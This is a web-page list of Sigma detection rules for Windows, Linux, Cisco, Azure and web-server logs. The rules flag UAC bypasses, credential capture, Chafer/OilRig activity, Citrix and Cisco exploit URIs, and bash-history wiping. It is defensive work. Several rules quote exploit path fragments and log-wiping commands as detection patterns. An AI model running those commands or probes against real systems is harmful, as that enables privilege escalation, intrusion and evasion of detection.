<li><a href="#">title:Bypass UAC Using Event Viewer id: 674202d0-b22a-4af4-ae5f-2eda1f3da1af description: Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification author: frack113 date: 2022/01/05 modified: 2022/03/26 status: experimental references: - - logsource: category: registry_set product: windows detection: selection: EventType: SetValue TargetObject|endswith: '_Classes\mscfile\shell\open\command\(Default)' filter: Details: '%SystemRoot%\system32\mmc.exe "%1" %*' condition: selection and not filter falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1547.010 
<li><a href="#">title:Bypass UAC Using SilentCleanup Task id: 724ea201-6514-4f38-9739-e5973c34f49a description: There is an auto-elevated task called SilentCleanup located in %windir%\system32\cleanmgr.exe This can be abused to elevate any file with Administrator privileges without prompting UAC author: frack113 date: 2022/01/06 modified: 2022/03/26 status: experimental references: - - logsource: category: registry_set product: windows detection: selection: TargetObject|endswith: '\Environment\windir' Details|contains: '&REM' EventType: SetValue condition: selection falsepositives: - Unknown level: high tags: - attack.privilege_escalation - attack.defense_evasion - attack.t1548.002 
<li><a href="#">title:Bypass UAC via CMSTP id: e66779cc-383e-4224-a3a4-267eeb585c40 status: test description: Detect commandline usage of Microsoft Connection Manager Profile Installer (cmstp.exe) to install specially formatted local .INF files author: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community references: - - - date: 2019/10/24 modified: 2022/05/16 logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: '\cmstp.exe' - OriginalFileName: 'CMSTP.EXE' selection_cli: CommandLine|contains: - '/s' - '/au' - '/ni' condition: all of selection* fields: - ComputerName - User - CommandLine falsepositives: - Legitimate use of cmstp.exe utility by legitimate user level: high tags: - attack.privilege_escalation - attack.defense_evasion - attack.t1548.002 - attack.t1218.003 
<li><a href="#">title:Bypass UAC via Fodhelper.exe id: 7f741dcf-fc22-4759-87b4-9ae8376676a2 status: test description: Identifies use of Fodhelper.exe to bypass User Account Control. Adversaries use this technique to execute privileged processes. author: E.M. Anhaus (originally from Atomic Blue Detections, Tony Lambert), oscd.community references: - - date: 2019/10/24 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\fodhelper.exe' condition: selection fields: - ComputerName - User - CommandLine falsepositives: - Legitimate use of fodhelper.exe utility by legitimate user level: high tags: - attack.privilege_escalation - attack.t1548.002 
<li><a href="#">title:Bypass UAC via WSReset.exe id: d797268e-28a9-49a7-b9a8-2f5039011c5c status: test description: Identifies use of WSReset.exe to bypass User Account Control. Adversaries use this technique to execute privileged processes. author: E.M. Anhaus (originally from Atomic Blue Detections, Tony Lambert), oscd.community references: - date: 2019/10/24 modified: 2022/05/13 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\wsreset.exe' filter: - Image|endswith: '\conhost.exe' - OriginalFileName: 'CONHOST.EXE' condition: selection and not filter falsepositives: - Unknown level: high tags: - attack.privilege_escalation - attack.t1548.002 
<li><a href="#">title:Cabinet File Expansion status: experimental id: 9f107a84-532c-41af-b005-8d12a607639f author: Bhabesh Raj date: 2021/07/30 modified: 2021/08/31 description: Adversaries can use the inbuilt expand utility to decompress cab files as seen in recent Iranian MeteorExpress attack references: - - tags: - attack.execution - attack.t1218 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\expand.exe' CommandLine|contains: - '.cab' - '/F:' - '-F:' - 'C:\ProgramData\' #Suspicious paths to curb FPs if any - 'C:\Public\' - '\AppData\Local\Temp\' - '\AppData\Roaming\Temp\' condition: selection fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - System administrator Usage level: medium 
<li><a href="#">title:CACTUSTORCH Remote Thread Creation id: 2e4e488a-6164-4811-9ea1-f960c7359c40 description: Detects remote thread creation from CACTUSTORCH as described in references. references: - - status: experimental author: '@SBousseaden (detection), Thomas Patzke (rule)' date: 2019/02/01 modified: 2021/11/12 logsource: product: windows category: create_remote_thread detection: selection: SourceImage|endswith: - '\System32\cscript.exe' - '\System32\wscript.exe' - '\System32\mshta.exe' - '\winword.exe' - '\excel.exe' TargetImage|contains: '\SysWOW64\' StartModule: null condition: selection tags: - attack.defense_evasion - attack.t1055.012 - attack.execution - attack.t1059.005 - attack.t1059.007 - attack.t1218.005 falsepositives: - Unknown level: high 
<li><a href="#">title:Capture a Network Trace with netsh.exe id: d3c3861d-c504-4c77-ba55-224ba82d0118 status: test description: Detects capture a network trace via netsh.exe trace functionality author: Kutepov Anton, oscd.community references: - date: 2019/10/24 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - netsh - trace - start condition: selection falsepositives: - Legitimate administrator or user uses netsh.exe trace functionality for legitimate reason level: medium tags: - attack.discovery - attack.credential_access - attack.t1040 
<li><a href="#">title:Capture Credentials with Rpcping.exe id: 93671f99-04eb-4ab4-a161-70d446a84003 status: test description: Detects using Rpcping.exe to send a RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process. author: Julia Fomina, oscd.community references: - - - - (v=ws.11) date: 2020/10/09 modified: 2021/11/27 logsource: category: process_creation product: windows detection: use_rpcping: Image|endswith: '\rpcping.exe' remote_server: CommandLine|contains: - '-s' - '/s' ntlm_auth: - CommandLine|contains|all: - '-u' - 'NTLM' - CommandLine|contains|all: - '/u' - 'NTLM' - CommandLine|contains|all: - '-t' - 'ncacn_np' - CommandLine|contains|all: - '/t' - 'ncacn_np' condition: use_rpcping and remote_server and ntlm_auth falsepositives: - Unlikely level: medium tags: - attack.credential_access - attack.t1003 
<li><a href="#">title:Cat Sudoers id: 0f79c4d2-4e1f-4683-9c36-b5469a665e06 status: test description: Detects the execution of a cat /etc/sudoers to list all users that have sudo rights author: Florian Roth references: - date: 2022/06/20 logsource: category: process_creation product: linux detection: selection: Image|endswith: - '/cat' - 'grep' CommandLine|contains: ' /etc/sudoers' condition: selection falsepositives: - Legitimate administration activities level: medium tags: - attack.reconnaissance - attack.t1592.004 
<li><a href="#">title:Certificate Request Export to Exchange Webserver id: b7bc7038-638b-4ffd-880c-292c692209ef status: experimental description: Detects a write of an Exchange CSR to an untypical directory or with aspx name suffix which can be used to place a webshell references: - author: Max Altgelt date: 2021/08/23 logsource: service: msexchange-management product: windows detection: export_command: - 'New-ExchangeCertificate' - ' -GenerateRequest' - ' -BinaryEncoded' - ' -RequestFile' export_params: - '\\\\localhost\\C$' - '\\\\127.0.0.1\\C$' - 'C:\\inetpub' - '.aspx' condition: all of export_command and export_params falsepositives: - Unlikely level: critical tags: - attack.persistence - attack.t1505.003 
<li><a href="#">title:Certutil Encode id: e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a status: test description: Detects suspicious a certutil command that used to encode files, which is sometimes used for data exfiltration author: Florian Roth, Jonhnathan Ribeiro, oscd.community references: - - date: 2019/02/24 modified: 2022/01/07 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\certutil.exe' CommandLine|contains|all: - '-f' - '-encode' condition: selection falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1027 
<li><a href="#">title:Chafer Activity id: 53ba33fd-3a50-4468-a5ef-c583635cfa92 description: Detects Chafer activity attributed to OilRig as reported in Nyotron report in March 2018 status: experimental references: - tags: - attack.persistence - attack.g0049 - attack.t1053.005 - attack.s0111 - attack.t1543.003 - attack.defense_evasion - attack.t1112 - attack.command_and_control - attack.t1071.004 date: 2018/03/23 modified: 2021/11/30 author: Florian Roth, Markus Neis, Jonhnathan Ribeiro, Daniil Yugoslavskiy, oscd.community logsource: product: windows service: system detection: selection_service: Provider_Name: 'Service Control Manager' EventID: 7045 ServiceName: - 'SC Scheduled Scan' - 'UpdatMachine' condition: selection_service falsepositives: - Unknown level: critical 
<li><a href="#">title:Chafer Activity id: 7bdf2a7c-3acc-4091-9581-0a77dad1c5b5 related: - id: 53ba33fd-3a50-4468-a5ef-c583635cfa92 type: derived description: Detects Chafer activity attributed to OilRig as reported in Nyotron report in March 2018 status: experimental references: - date: 2018/03/23 modified: 2021/09/19 author: Florian Roth, Markus Neis, Jonhnathan Ribeiro, Daniil Yugoslavskiy, oscd.community logsource: category: registry_event product: windows detection: selection_reg1: TargetObject|endswith: - 'SOFTWARE\Microsoft\Windows\CurrentVersion\UMe' - 'SOFTWARE\Microsoft\Windows\CurrentVersion\UT' condition: selection_reg1 falsepositives: - Unknown level: critical tags: - attack.persistence - attack.g0049 - attack.t1053.005 - attack.s0111 - attack.t1543.003 - attack.defense_evasion - attack.t1112 - attack.command_and_control - attack.t1071.004 
<li><a href="#">title:Chafer Activity id: c0580559-a6bd-4ef6-b9b7-83703d98b561 related: - id: 53ba33fd-3a50-4468-a5ef-c583635cfa92 type: derived description: Detects Chafer activity attributed to OilRig as reported in Nyotron report in March 2018 status: experimental references: - tags: - attack.persistence - attack.g0049 - attack.t1053.005 - attack.s0111 - attack.t1543.003 - attack.defense_evasion - attack.t1112 - attack.command_and_control - attack.t1071.004 date: 2018/03/23 modified: 2021/09/19 author: Florian Roth, Markus Neis, Jonhnathan Ribeiro, Daniil Yugoslavskiy, oscd.community logsource: product: windows service: security detection: selection_service: EventID: 4698 TaskName: - 'SC Scheduled Scan' - 'UpdatMachine' condition: selection_service falsepositives: - Unknown level: critical 
<li><a href="#">title:Chafer Activity id: ce6e34ca-966d-41c9-8d93-5b06c8b97a06 related: - id: 53ba33fd-3a50-4468-a5ef-c583635cfa92 type: derived description: Detects Chafer activity attributed to OilRig as reported in Nyotron report in March 2018 status: test references: - tags: - attack.persistence - attack.g0049 - attack.t1053.005 - attack.s0111 - attack.t1543.003 - attack.defense_evasion - attack.t1112 - attack.command_and_control - attack.t1071.004 date: 2018/03/23 modified: 2021/09/19 author: Florian Roth, Markus Neis, Jonhnathan Ribeiro, Daniil Yugoslavskiy, oscd.community logsource: category: process_creation product: windows detection: selection_process0: CommandLine|contains: '\Service.exe' CommandLine|endswith: - 'i' - 'u' selection_process1: - CommandLine|endswith: '\microsoft\Taskbar\autoit3.exe' - CommandLine|startswith: 'C:\wsc.exe' selection_process2: Image|contains: '\Windows\Temp\DB\' Image|endswith: '.exe' selection_process3: CommandLine|contains|all: - '\nslookup.exe' - '-q=TXT' ParentImage|contains: '\Autoit' condition: 1 of selection* falsepositives: - Unknown level: high 
<li><a href="#">title:Chafer Malware URL Pattern id: fb502828-2db0-438e-93e6-801c7548686d status: test description: Detects HTTP requests used by Chafer malware author: Florian Roth references: - date: 2019/01/31 modified: 2021/11/27 logsource: category: proxy detection: selection: c-uri|contains: '/asp.asp?ui=' condition: selection fields: - ClientIP - c-uri - c-useragent falsepositives: - Unknown level: critical tags: - attack.command_and_control - attack.t1071.001 
<li><a href="#">title:Change Default File Association id: 3d3aa6cd-6272-44d6-8afc-7e88dfef7061 status: test description: When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility. Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened. author: Timur Zinniatullin, oscd.community references: - date: 2019/10/21 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - 'cmd' - '/c' - 'assoc' condition: selection fields: - Image - CommandLine - User - LogonGuid - Hashes - ParentProcessGuid - ParentCommandLine falsepositives: - Admin activity level: low tags: - attack.persistence - attack.t1546.001 
<li><a href="#">title:Change Default File Association To Executable id: ae6f14e6-14de-45b0-9f44-c0986f50dc89 related: - id: 3d3aa6cd-6272-44d6-8afc-7e88dfef7061 type: derived status: experimental description: Detects when a program changes the default file association of any extension to an executable author: Nasreddine Bencherchali references: - date: 2022/06/28 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - 'cmd' - ' /c ' - 'assoc ' - 'exefile' filter: CommandLine|contains: '.exe=exefile' condition: selection and not filter falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1546.001 
<li><a href="#">title:Change Outlook Security Setting in Registry id: c3cefdf4-6703-4e1c-bad8-bf422fc5015a description: Change outlook email security settings author: frack113 date: 2021/12/28 modified: 2022/03/26 status: experimental references: - - logsource: category: registry_set product: windows detection: selection: TargetObject|contains|all: - '\SOFTWARE\Microsoft\Office\' - '\Outlook\Security\' EventType: SetValue condition: selection falsepositives: - Administrative scripts level: medium tags: - attack.persistence - attack.t1137 
<li><a href="#">title:Change PowerShell Policies to an Unsecure Level id: 61d0475c-173f-4844-86f7-f3eebae1c66b description: Detects use of Set-ExecutionPolicy to set a unsecure policies status: experimental references: - - - tags: - attack.execution - attack.t1059.001 author: frack113 date: 2021/10/20 modified: 2022/02/23 logsource: product: windows category: ps_script detection: cmdlet: ScriptBlockText|contains: 'Set-ExecutionPolicy' option: ScriptBlockText|contains: - 'Unrestricted' - 'bypass' - 'RemoteSigned' filter: - ParentImage: - 'C:\ProgramData\chocolatey\choco.exe' - ScriptBlockText|contains: - "(New-Object System.Net.WebClient).DownloadString('')" - "(New-Object System.Net.WebClient).DownloadString('')" condition: cmdlet and option and not filter falsepositives: - Administrator script level: medium 
<li><a href="#">title:Change PowerShell Policies to an Unsecure Level id: 87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180 description: Detects use of executionpolicy option to set a unsecure policies status: experimental references: - - - - tags: - attack.execution - attack.t1059.001 author: frack113 date: 2021/11/01 modified: 2022/02/23 logsource: product: windows category: process_creation detection: option: CommandLine|contains: - ' -executionpolicy ' - ' -ep ' - ' -exec ' level: CommandLine|contains: - 'Unrestricted' - 'bypass' - 'RemoteSigned' condition: option and level falsepositives: - Administrator script level: medium 
<li><a href="#">title:Change to Authentication Method id: 4d78a000-ab52-4564-88a5-7ab5242b20c7 status: experimental author: AlertIQ date: 2021/10/10 description: Change to authentication method could be an indicated of an attacker adding an auth method to the account so they can have continued access. references: - logsource: product: azure service: auditlogs detection: selection: LoggedByService: 'Authentication Methods' Category: 'UserManagement' OperationName: 'User registered security info' condition: selection level: medium falsepositives: - Unknown tags: - attack.credential_access 
<li><a href="#">title:Change User Agents with WebRequest id: d4488827-73af-4f8d-9244-7b7662ef046e status: experimental author: frack113 date: 2022/01/23 description: | Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. references: - logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - Invoke-WebRequest - '-UserAgent ' condition: selection falsepositives: - Unknown level: medium tags: - attack.command_and_control - attack.t1071.001 
<li><a href="#">title:Changes to Device Registration Policy id: 9494bff8-959f-4440-bbce-fb87a208d517 description: Monitor and alert for changes to the device registration policy. author: Michael Epping, '@mepples21' date: 2022/06/28 references: - logsource: product: azure service: auditlogs detection: selection: Category: 'Policy' ActivityDisplayName: 'Set device registration policies' condition: selection falsepositives: - Unknown level: high status: experimental tags: - attack.domain_policy_modification - attack.t1484 
<li><a href="#">title:Changing RDP Port to Non Standard Number id: 509e84b9-a71a-40e0-834f-05470369bd1e description: | Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). author: frack113 date: 2022/01/01 modified: 2022/03/26 status: experimental references: - logsource: category: registry_set product: windows detection: selection: EventType: SetValue TargetObject: HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\PortNumber filter: Details: DWORD (0x00000d3d) condition: selection and not filter falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1547.010 
<li><a href="#">title:CHCP CodePage Locale Lookup id: 7090adee-82e2-4269-bd59-80691e7c6338 status: experimental description: Detects use of chcp to look up the system locale value as part of host discovery author: '_pete_0, TheDFIRReport' references: - - date: 2022/02/21 modified: 2022/04/21 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\cmd.exe' ParentCommandLine|contains: ' /c ' Image|endswith: '\chcp.com' CommandLine|endswith: - 'chcp' - 'chcp ' - 'chcp ' condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high tags: - attack.discovery - attack.t1614.001 
<li><a href="#">title:Chmod Suspicious Directory id: 6419afd1-3742-47a5-a7e6-b50386cd15f8 status: experimental description: Detects chmod targeting files in abnormal directory paths. author: 'Christopher Peacock @SecurePeacock, SCYTHE @scythe_io' references: - - date: 2022/06/03 logsource: product: linux category: process_creation detection: selection: Image|endswith: '/chmod' CommandLine|contains: - '/tmp/' - '/.Library/' - '/etc/' - '/opt/' condition: selection falsepositives: - Admin changing file permissions. level: medium tags: - attack.defense_evasion - attack.t1222.002 
<li><a href="#">title:Cisco ASA FTD Exploit CVE-2020-3452 id: aba47adc-4847-4970-95c1-61dce62a8b29 status: experimental description: Detects exploitation attempts on Cisco ASA FTD systems exploiting CVE-2020-3452 with a status code of 200 (sccessful exploitation) author: Florian Roth date: 2021/01/07 references: - - logsource: category: webserver detection: selection_endpoint: c-uri|contains: - '+CSCOT+/translation-table' - '+CSCOT+/oem-customization' selection_path_select: c-uri|contains: - '&textdomain=/' - '&textdomain=%' - '&name=/' - '&name=%' select_status_code: sc-status: 200 condition: selection_endpoint and selection_path_select and select_status_code fields: - c-ip - c-dns falsepositives: - Unknown level: high tags: - attack.t1190 - attack.initial_access - cve.2020.3452 
<li><a href="#">title:Cisco Clear Logs id: ceb407f6-8277-439b-951f-e4210e3ed956 status: test description: Clear command history in network OS which is used for defense evasion author: Austin Clark date: 2019/08/12 modified: 2021/11/27 logsource: product: cisco service: aaa category: accounting detection: keywords: - 'clear logging' - 'clear archive' condition: keywords fields: - src - CmdSet - User - Privilege_Level - Remote_Address falsepositives: - Legitimate administrators may run these commands level: high tags: - attack.defense_evasion - attack.t1070.003 
<li><a href="#">title:Cisco Collect Data id: cd072b25-a418-4f98-8ebc-5093fb38fe1a status: test description: Collect pertinent data from the configuration files author: Austin Clark date: 2019/08/11 modified: 2021/11/27 logsource: product: cisco service: aaa category: accounting detection: keywords: - 'show running-config' - 'show startup-config' - 'show archive config' - 'more' condition: keywords fields: - src - CmdSet - User - Privilege_Level - Remote_Address falsepositives: - Commonly run by administrators level: low tags: - attack.discovery - attack.credential_access - attack.collection - attack.t1087.001 - attack.t1552.001 - attack.t1005 
<li><a href="#">title:Cisco Crypto Commands id: 1f978c6a-4415-47fb-aca5-736a44d7ca3d status: test description: Show when private keys are being exported from the device, or when new certificates are installed author: Austin Clark date: 2019/08/12 modified: 2021/11/27 logsource: product: cisco service: aaa category: accounting detection: keywords: - 'crypto pki export' - 'crypto pki import' - 'crypto pki trustpoint' condition: keywords fields: - src - CmdSet - User - Privilege_Level - Remote_Address falsepositives: - Not commonly run by administrators. Also whitelist your known good certificates level: high tags: - attack.credential_access - attack.defense_evasion - attack.t1553.004 - attack.t1552.004 
<li><a href="#">title:Cisco Denial of Service id: d94a35f0-7a29-45f6-90a0-80df6159967c status: test description: Detect a system being shutdown or put into different boot mode author: Austin Clark date: 2019/08/15 modified: 2021/11/27 logsource: product: cisco service: aaa category: accounting detection: keywords: - 'shutdown' - 'config-register 0x2100' - 'config-register 0x2142' condition: keywords fields: - CmdSet falsepositives: - Legitimate administrators may run these commands, though rarely. level: medium tags: - attack.impact - attack.t1495 - attack.t1529 - attack.t1565.001 
<li><a href="#">title:Cisco Disabling Logging id: 9e8f6035-88bf-4a63-96b6-b17c0508257e status: test description: Turn off logging locally or remote author: Austin Clark date: 2019/08/11 modified: 2021/11/27 logsource: product: cisco service: aaa category: accounting detection: keywords: - 'no logging' - 'no aaa new-model' condition: keywords fields: - src - CmdSet - User - Privilege_Level - Remote_Address falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1562.001 
<li><a href="#">title:Cisco Discovery id: 9705a6a1-6db6-4a16-a987-15b7151e299b status: test description: Find information about network devices that is not stored in config files author: Austin Clark date: 2019/08/12 modified: 2021/11/27 logsource: product: cisco service: aaa category: accounting detection: keywords: - 'dir' - 'show processes' - 'show arp' - 'show cdp' - 'show version' - 'show ip route' - 'show ip interface' - 'show ip sockets' - 'show users' - 'show ssh' - 'show clock' condition: keywords fields: - src - CmdSet - User - Privilege_Level - Remote_Address falsepositives: - Commonly used by administrators for troubleshooting level: low tags: - attack.discovery - attack.t1083 - attack.t1201 - attack.t1057 - attack.t1018 - attack.t1082 - attack.t1016 - attack.t1049 - attack.t1033 - attack.t1124 
<li><a href="#">title:Cisco File Deletion id: 71d65515-c436-43c0-841b-236b1f32c21e status: test description: See what files are being deleted from flash file systems author: Austin Clark date: 2019/08/12 modified: 2021/11/27 logsource: product: cisco service: aaa category: accounting detection: keywords: - 'erase' - 'delete' - 'format' condition: keywords fields: - CmdSet falsepositives: - Will be used sometimes by admins to clean up local flash space level: medium tags: - attack.defense_evasion - attack.impact - attack.t1070.004 - attack.t1561.001 - attack.t1561.002 
<li><a href="#">title:Cisco Local Accounts id: 6d844f0f-1c18-41af-8f19-33e7654edfc3 status: test description: Find local accounts being created or modified as well as remote authentication configurations author: Austin Clark date: 2019/08/12 modified: 2021/11/27 logsource: product: cisco service: aaa category: accounting detection: keywords: - 'username' - 'aaa' condition: keywords fields: - CmdSet falsepositives: - When remote authentication is in place, this should not change often level: high tags: - attack.persistence - attack.t1136.001 - attack.t1098 
<li><a href="#">title:Cisco Modify Configuration id: 671ffc77-50a7-464f-9e3d-9ea2b493b26b status: test description: Modifications to a config that will serve an adversary's impacts or persistence author: Austin Clark date: 2019/08/12 modified: 2021/11/27 logsource: product: cisco service: aaa category: accounting detection: keywords: - 'ip http server' - 'ip https server' - 'kron policy-list' - 'kron occurrence' - 'policy-list' - 'access-list' - 'ip access-group' - 'archive maximum' condition: keywords fields: - CmdSet falsepositives: - Legitimate administrators may run these commands level: medium tags: - attack.persistence - attack.impact - attack.t1490 - attack.t1505 - attack.t1565.002 - attack.t1053 
<li><a href="#">title:Cisco Show Commands Input id: b094d9fb-b1ad-4650-9f1a-fb7be9f1d34b status: test description: See what commands are being input into the device by other people, full credentials can be in the history author: Austin Clark date: 2019/08/11 modified: 2021/11/27 logsource: product: cisco service: aaa category: accounting detection: keywords: - 'show history' - 'show history all' - 'show logging' condition: keywords fields: - CmdSet falsepositives: - Not commonly run by administrators, especially if remote logging is configured level: medium tags: - attack.credential_access - attack.t1552.003 
<li><a href="#">title:Cisco Sniffing id: b9e1f193-d236-4451-aaae-2f3d2102120d status: test description: Show when a monitor or a span/rspan is setup or modified author: Austin Clark date: 2019/08/11 modified: 2021/11/27 logsource: product: cisco service: aaa category: accounting detection: keywords: - 'monitor capture point' - 'set span' - 'set rspan' condition: keywords fields: - CmdSet falsepositives: - Admins may setup new or modify old spans, or use a monitor for troubleshooting level: medium tags: - attack.credential_access - attack.discovery - attack.t1040 
<li><a href="#">title:Cisco Stage Data id: 5e51acb2-bcbe-435b-99c6-0e3cd5e2aa59 status: test description: Various protocols maybe used to put data on the device for exfil or infil author: Austin Clark date: 2019/08/12 modified: 2021/11/27 logsource: product: cisco service: aaa category: accounting detection: keywords: - 'tftp' - 'rcp' - 'puts' - 'copy' - 'configure replace' - 'archive tar' condition: keywords fields: - CmdSet falsepositives: - Generally used to copy configs or IOS images level: low tags: - attack.collection - attack.lateral_movement - attack.command_and_control - attack.exfiltration - attack.t1074 - attack.t1105 - attack.t1560.001 
<li><a href="#">title:Citrix ADS Exploitation CVE-2020-8193 CVE-2020-8195 description: Detects exploitation attempt against Citrix Netscaler, Application Delivery Controller (ADS) and Citrix Gateway exploiting vulnerabilities reported as CVE-2020-8193 and CVE-2020-8195 id: 0d0d9a8a-a49e-4e27-b061-7ce4b936cfb7 author: Florian Roth status: experimental date: 2020/07/10 modified: 2021/08/09 references: - - - logsource: category: webserver detection: selection1: c-uri|contains: '/rapi/filedownload?filter=path:%2F' selection2: c-uri|contains|all: - '/pcidss/report' - 'type=all_signatures' - 'sig_name=_default_signature_' condition: 1 of selection* fields: - client_ip - vhost - url - response falsepositives: - Unknown level: critical tags: - attack.initial_access - attack.t1190 
<li><a href="#">title:Citrix Netscaler Attack CVE-2019-19781 id: ac5a6409-8c89-44c2-8d64-668c29a2d756 status: test description: Detects CVE-2019-19781 exploitation attempt against Citrix Netscaler, Application Delivery Controller and Citrix Gateway Attack author: Arnim Rupp, Florian Roth references: - - - - - date: 2020/01/02 modified: 2021/11/27 logsource: category: webserver definition: 'Make sure that your Netscaler appliance logs all kinds of attacks (test with ). The directory traversal with ../ might not be needed on certain cloud instances or for authenticated users, so we also check for direct paths. All scripts in portal/scripts are exploitable except logout.pl.' detection: selection: c-uri: - '*/../vpns/*' - '*/vpns/cfg/smb.conf' - '*/vpns/portal/scripts/*.pl*' condition: selection fields: - client_ip - vhost - url - response falsepositives: - Unknown level: critical tags: - attack.initial_access - attack.t1190 
<li><a href="#">title:CL_LoadAssembly.ps1 Proxy Execution id: c57872c7-614f-4d7f-a40d-b78c8df2d30d description: Detects the use of a Micorsoft signed script to execute commands and bypassing AppLocker. status: experimental references: - - author: frack113 date: 2022/05/21 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - '\CL_LoadAssembly.ps1' - 'LoadAssemblyFromPath ' condition: selection falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1216 
<li><a href="#">title:CL_Mutexverifiers.ps1 Proxy Execution id: 1e0e1a81-e79b-44bc-935b-ddb9c8006b3d description: Detects the use of a Micorsoft signed script to execute commands status: experimental references: - author: oscd.community, Natalia Shornikova, frack113 date: 2022/05/21 modified: 2022/06/28 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - '\CL_Mutexverifiers.ps1' - 'runAfterCancelProcess ' condition: selection falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1216 
<li><a href="#">title:Classes Autorun Keys Modification id: 9df5f547-c86a-433e-b533-f2794357e242 related: - id: 17f878b8-9968-4578-b814-c4217fc5768c type: derived status: experimental description: Detects modification of autostart extensibility point (ASEP) in registry. author: Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split) references: - - - # a list with registry keys date: 2019/10/25 modified: 2022/06/04 logsource: category: registry_set product: windows detection: classes_base: EventType: SetValue TargetObject|contains: '\Software\Classes' classes: TargetObject|contains: - '\Folder\ShellEx\ExtShellFolderViews' - '\Folder\ShellEx\DragDropHandlers' - '\Folder\Shellex\ColumnHandlers' - '\Filter' - '\Exefile\Shell\Open\Command\(Default)' - '\Directory\Shellex\DragDropHandlers' - '\Directory\Shellex\CopyHookHandlers' - '\CLSID\{AC757296-3522-4E11-9862-C17BE5A1767E}\Instance' - '\CLSID\{ABE3B9A4-257D-4B97-BD1A-294AF496222E}\Instance' - '\CLSID\{7ED96837-96F0-4812-B211-F13C24117ED3}\Instance' - '\CLSID\{083863F1-70DE-11d0-BD40-00A0C911CE86}\Instance' - '\Classes\AllFileSystemObjects\ShellEx\DragDropHandlers' - '\.exe' - '\.cmd' - '\ShellEx\PropertySheetHandlers' - '\ShellEx\ContextMenuHandlers' filter_empty: Details: '(Empty)' filter_msoffice: Details: '{807583E5-5146-11D5-A672-00B0D022E945}' filter_drivers: Image: 'C:\Windows\System32\drvinst.exe' condition: classes_base and classes and not 1 of filter_* fields: - SecurityID - ObjectName - OldValueType - NewValueType falsepositives: - Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reason - Legitimate administrator sets up autorun keys for legitimate reason level: medium tags: - attack.persistence - attack.t1547.001 
<li><a href="#">title:CleanWipe Usage id: f44800ac-38ec-471f-936e-3fa7d9c53100 status: experimental description: Detects the use of CleanWipe a tool usually used to delete Symantec antivirus. references: - author: Nasreddine Bencherchali @nas_bench date: 2021/12/18 tags: - attack.defense_evasion - attack.t1562.001 logsource: category: process_creation product: windows detection: selection1: Image|endswith: '\SepRemovalToolNative_x64.exe' selection2: Image|endswith: '\CATClean.exe' CommandLine|contains: '--uninstall' selection3: Image|endswith: '\NetInstaller.exe' CommandLine|contains: '-r' selection4: Image|endswith: '\WFPUnins.exe' CommandLine|contains|all: - '/uninstall' - '/enterprise' condition: 1 of selection* falsepositives: - Legitimate administrative use level: medium 
<li><a href="#">title:Clear Command History id: fdc88d25-96fb-4b7c-9633-c0e417fdbd4e status: experimental description: Clear command history in linux which is used for defense evasion. # Example config for this one (place it in .bash_profile): # (is_empty=false; inotifywait -m .bash_history | while read file; do if [ $(wc -l <.bash_history) -lt 1 ]; then if [ "$is_empty" = false ]; then logger -i -p local5.info -t empty_bash_history "$USER : ~/.bash_history is empty "; is_empty=true; fi; else is_empty=false; fi; done ) & # It monitors the size of .bash_history and log the words "empty_bash_history" whenever a previously not empty bash_history becomes empty # We define an empty file as a document with 0 or 1 lines (it can be a line with only one space character for example) # It has two advantages over the version suggested by Patrick Bareiss : # - it is not relative to the exact command used to clear .bash_history : for instance Caldera uses "> .bash_history" to clear the history and this is not one the commands listed here. We can't be exhaustive for all the possibilities ! # - the method suggested by Patrick Bareiss logs all the commands entered directly in a bash shell. therefore it may miss some events (for instance it doesn't log the commands launched from a Caldera agent). Here if .bash_history is cleared, it will always be detected author: Patrick Bareiss date: 2019/03/24 modified: 2021/11/24 references: - - - logsource: product: linux detection: keywords: - 'rm *bash_history' - 'echo "" > *bash_history' - 'cat /dev/null > *bash_history' - 'cat /dev/zero > *bash_history' - 'ln -sf /dev/null *bash_history' - 'ln -sf /dev/zero *bash_history' - 'truncate -s0 *bash_history' # - 'unset HISTFILE' # prone to false positives - 'export HISTFILESIZE=0' - 'history -c' - 'history -w' - 'shred *bash_history' - 'empty_bash_history' - 'chattr +i *bash_history' condition: keywords falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1070.003 
